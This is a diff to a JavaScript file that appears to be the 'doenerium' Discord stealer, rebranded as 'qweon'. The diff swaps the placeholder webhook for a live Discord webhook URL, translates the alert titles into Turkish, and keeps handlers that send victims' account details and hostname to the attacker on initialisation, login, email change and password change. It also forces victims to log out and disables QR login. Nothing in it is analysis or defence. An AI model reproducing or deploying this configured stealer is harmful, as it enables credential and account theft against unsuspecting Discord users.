@@ -11,25 +11,25 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "qweon",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://discord.com/api/webhooks/1198768438554931370/9cKvsp0vqhzS8Agh-3YP-anAUxT4ESH8KfiOBfLmU01lSX0I50kkunT7lbW4FSQoZEsn",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [false],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "qwe10",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `qweon`,
+           // icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "https://discord.com/login",
+     //   avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
@@ -338,7 +338,7 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | User logged in",
+                title: "Discord | Kullanıcı Giriş Yaptı",
                 url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
@@ -411,7 +411,7 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Email changed",
+                title: "Discord | Mail Değiştirildi",
                 url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
@@ -484,7 +484,7 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Password changed",
+                title: "Discord | Şifre Değiştirildi xd",
                 url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
@@ -715,7 +715,7 @@ async function initialize() {
                     avatar_url: config.embed.avatar_url,
                     url: config.embed.href,
                     embeds: [createEmbed({
-                        title: "Discord | Client initialized (not logged in)",
+                        title: "Discord | Uygulaması Başlatıldı (henüz giriş yapılmadı)",
                         fields: [{
                             name: "Hostname",
                             value: `\`\`\`${os.hostname}\`\`\``,
@@ -740,7 +740,7 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Discord | Client initialized",
+                        title: "Discord | Uygulama Başlatıldı",
                         url: config.embed.href,
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
